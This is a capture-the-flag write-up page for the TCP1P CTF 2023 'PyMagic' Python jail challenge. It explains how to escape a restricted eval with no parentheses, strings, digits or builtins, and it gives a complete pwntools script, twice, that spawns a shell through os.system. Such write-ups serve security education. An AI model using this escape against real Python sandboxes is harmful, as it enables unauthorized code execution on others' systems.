@@ -1,0 +1,445 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/misc/pyjail/tcp1p-ctf-2023-pymagic.html">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Tcp1p ctf 2023 pymagic - CTF Writeups by @jiegec</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="2"><a href="#tcp1p-ctf-2023-pymagic" class="nav-link">TCP1P CTF 2023 PyMagic</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h2 id="tcp1p-ctf-2023-pymagic">TCP1P CTF 2023 PyMagic</h2>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python3
+import re
+
+class something_to_do_huh:...
+eval = eval
+code = input('&gt;&gt;&gt; ')
+
+if not re.findall('[()\'"0123456789 ]', code):
+    for k in (b:=__builtins__.__dict__).keys():
+        b[k] = None
+
+    eval(code, {'__builtins__': {}, '_': something_to_do_huh})</code></pre>
+<p>Requirements:</p>
+<ol>
+<li>No <code>()</code>: Use <code>class.__class_getitem__</code> and <code>class[]</code> to bypass</li>
+<li>No strings: Use docstrings and <code>str[index]</code> to create strings</li>
+<li>No numbers: Use <code>True</code> as 1</li>
+<li>No spaces: Use <code>\r</code> to bypass while making <code>input()</code> happy</li>
+<li>No builtins: Use <code>().__class__.__base__.__subclasses__()</code></li>
+</ol>
+<p>First, we need to find the familiar classes we want, e.g. <code>_sitebuiltins._Helper</code> from <code>().__class__.__base__.__subclasses__()</code>. However, we cannot use <code>()</code>, so to invoke the function, inspired by <a href="https://starlit.melyr.space/posts/l3akctf-2024/pysysmagic/">misc/PySysMagic writeup</a>, we need to:</p>
+<ol>
+<li>Assign <code>_.__class_getitem__</code> to <code>type.__subclasses__</code> using <code>[None for _.__class_getitem__ in [type.__subclasses__]]</code></li>
+<li>Use <code>_[[].__class__.__base__]</code> to invoke <code>().__class__.__base__.__subclasses__()</code>: because <code>_</code> is the class, so <code>_[arg]</code> is essentially <code>_.__class__getitem__(arg)</code></li>
+</ol>
+<p>Code:</p>
+<pre class="highlight"><code class="language-python">[
+    type:=[].__class__.__class__,
+    [None for _.__class_getitem__ in [type.__subclasses__]],
+    _[[].__class__.__base__],
+]</code></pre>
+<p>Then, we can locate the familiar classes here. The next thing is to get shell. Since <code>__class_getitem__</code> requires exactly one argument to call, so we use <code>sys.modules("os").system("sh")</code> directly instead:</p>
+<ol>
+<li>To find <code>os</code>, we need to locate <code>_sitebuiltins.Printer</code> class</li>
+<li>Under its <code>__init__.__globals__</code>, use <code>dict.values(arg)</code> to extract its values</li>
+<li>Since <code>dict.values()</code> returns an iterator, convert it to list using <code>list(arg)</code></li>
+<li>Now sys is in the list: <code>sys = values[-4]</code>, os is <code>sys.modules["os"]</code></li>
+<li>Call <code>os.system("sh")</code> using the trick <code>[None for _.__class_getitem__ in [os.system]], _["sh"]</code></li>
+</ol>
+<p>The strings above are constructed from help text.</p>
+<p>Attack script:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="debug")
+
+subclasses = str(().__class__.__base__.__subclasses__())
+
+# find the indices of the builtins
+# assuming we are using the same Python version as remote
+
+# assuming dict is at 28
+dict_index = 28
+assert subclasses.split(", ").index("&lt;class 'dict'&gt;") == dict_index
+# assuming list is at 42
+list_index = 42
+assert subclasses.split(", ").index("&lt;class 'list'&gt;") == list_index
+# assuming Printer is at 160
+printer_index = 160
+assert subclasses.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;") == printer_index
+# assuming Helper is at 161
+helper_index = 161
+assert subclasses.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;") == helper_index
+
+help_text = ().__class__.__base__.__subclasses__()[helper_index].__doc__
+
+
+def get_index(index):
+    parts = (
+        ["True"] * (index % 10)
+        + ["A"] * (index // 10 % 10)
+        + ["B"] * (index // 100 % 10)
+    )
+    return "+".join(parts)
+
+
+# synthesize string from help_text
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p = process(["python3", "pymagic.py"])
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(
+    (
+        # A=10, B=100
+        "[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,"
+        # get indices for dict, list, Printer, Helper
+        + f"D:={get_index(dict_index)},"
+        + f"L:={get_index(list_index)},"
+        + f"P:={get_index(printer_index)},"
+        + f"H:={get_index(helper_index)},"
+        # _.__class_getitem__ becomes type.__subclasses__
+        + "type:=[].__class__.__class__,[None for _.__class_getitem__ in [type.__subclasses__]],"
+        # locate dict: type.__subclasses__([].__class__.__base__))[D]
+        + "dict:=_[[].__class__.__base__][D],"
+        # locate list
+        + "list:=_[[].__class__.__base__][L],"
+        # locate Printer
+        + "Printer:=_[[].__class__.__base__][P],"
+        # locate Helper
+        + "Helper:=_[[].__class__.__base__][H],"
+        # read help_text
+        + "S:=Helper.__doc__,"
+        # _.__class_getitem__ becomes dict.values
+        + "[None for _.__class_getitem__ in [dict.values]],"
+        # values = dict.values(Printer.__init__.__globals)
+        + "[values:=_[Printer.__init__.__globals__],None][True],"
+        # _.__class_getitem__ becomes list
+        + "[None for _.__class_getitem__ in [list]],"
+        # values = list(values)
+        + "[values:=_[values],None][True],"
+        # sys = values[-4]
+        + "[sys:=values[True-True-True-True-True-True],None][True],"
+        # os = sys.modules["os"]
+        + f"[os:=sys.modules[{synthesize("os")}],None][True],"
+        # _.__class_getitem__ becomes os.system
+        + "[None for _.__class_getitem__ in [os.system]],"
+        + f"_[{synthesize("sh")}],"
+        + "]"
+    )
+    .replace(" ", "\r")
+    .encode()
+)
+p.interactive()</code></pre>
+<p>Some tips on debugging: To aid debugging, we change the script to print result and complain if validation fails:</p>
+<pre class="highlight"><code class="language-python">#!/usr/bin/env python3
+import re
+
+class something_to_do_huh:...
+eval = eval
+print = print
+code = input('&gt;&gt;&gt; ')
+
+if not re.findall('[()\'"0123456789 ]', code):
+    for k in (b:=__builtins__.__dict__).keys():
+        b[k] = None
+
+    print(eval(code, {'__builtins__': {}, '_': something_to_do_huh}))
+else:
+    print("fail")</code></pre>
+<p>However, <code>print</code>-ing some values may fail due to missing builtins. Therefore, we convert the non-printable values by converting:</p>
+<pre class="highlight"><code class="language-python">[
+    A:=B,
+]</code></pre>
+<p>to</p>
+<pre class="highlight"><code class="language-python">[
+    [A:=B, None][True],
+]</code></pre>
+<p>That's why it appears weird in the attack script above. Actually, it can be simplified:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="debug")
+
+subclasses = str(().__class__.__base__.__subclasses__())
+
+# find the indices of the builtins
+# assuming we are using the same Python version as remote
+
+# assuming dict is at 28
+dict_index = 28
+assert subclasses.split(", ").index("&lt;class 'dict'&gt;") == dict_index
+# assuming list is at 42
+list_index = 42
+assert subclasses.split(", ").index("&lt;class 'list'&gt;") == list_index
+# assuming Printer is at 160
+printer_index = 160
+assert subclasses.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;") == printer_index
+# assuming Helper is at 161
+helper_index = 161
+assert subclasses.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;") == helper_index
+
+help_text = ().__class__.__base__.__subclasses__()[helper_index].__doc__
+
+
+def get_index(index):
+    parts = (
+        ["True"] * (index % 10)
+        + ["A"] * (index // 10 % 10)
+        + ["B"] * (index // 100 % 10)
+    )
+    return "+".join(parts)
+
+
+# synthesize string from help_text
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p = process(["python3", "pymagic.py"])
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(
+    (
+        # A=10, B=100
+        "[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,"
+        # get indices for dict, list, Printer, Helper
+        + f"D:={get_index(dict_index)},"
+        + f"L:={get_index(list_index)},"
+        + f"P:={get_index(printer_index)},"
+        + f"H:={get_index(helper_index)},"
+        # _.__class_getitem__ becomes type.__subclasses__
+        + "type:=[].__class__.__class__,[None for _.__class_getitem__ in [type.__subclasses__]],"
+        # locate dict: type.__subclasses__([].__class__.__base__))[D]
+        + "dict:=_[[].__class__.__base__][D],"
+        # locate list
+        + "list:=_[[].__class__.__base__][L],"
+        # locate Printer
+        + "Printer:=_[[].__class__.__base__][P],"
+        # locate Helper
+        + "Helper:=_[[].__class__.__base__][H],"
+        # read help_text
+        + "S:=Helper.__doc__,"
+        # _.__class_getitem__ becomes dict.values
+        + "[None for _.__class_getitem__ in [dict.values]],"
+        # values = dict.values(Printer.__init__.__globals)
+        + "values:=_[Printer.__init__.__globals__],"
+        # _.__class_getitem__ becomes list
+        + "[None for _.__class_getitem__ in [list]],"
+        # values = list(values)
+        + "values:=_[values],"
+        # sys = values[-4]
+        + "sys:=values[True-True-True-True-True-True],"
+        # os = sys.modules["os"]
+        + f"os:=sys.modules[{synthesize("os")}],"
+        # _.__class_getitem__ becomes os.system
+        + "[None for _.__class_getitem__ in [os.system]],"
+        + f"_[{synthesize("sh")}],"
+        + "]"
+    )
+    .replace(" ", "\r")
+    .encode()
+)
+p.interactive()</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
